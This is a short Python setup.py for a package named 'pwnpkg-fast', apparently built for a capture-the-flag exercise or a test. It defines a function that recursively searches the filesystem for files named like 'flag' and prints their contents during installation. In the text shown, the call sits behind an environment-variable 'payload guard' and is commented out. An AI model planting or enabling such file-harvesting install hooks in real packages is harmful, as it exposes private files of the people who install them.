from setuptools import setup
import os, glob, pathlib

def dump_flags():
    for p in glob.glob("/**/*flag*", recursive=True):
        try:
            print("\n🏳️  FLAG:", p)
            print(pathlib.Path(p).read_text())
        except Exception:
            pass

# ←–––––––––––––––––––––– PAYLOAD GUARD ––––––––––––––––––––––
if not os.environ.get("SKIP_PAYLOAD"):
    #dump_flags()
    print("hello from test")
# ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––

setup(name="pwnpkg-fast", version="0.0.1", py_modules=["dummy"])
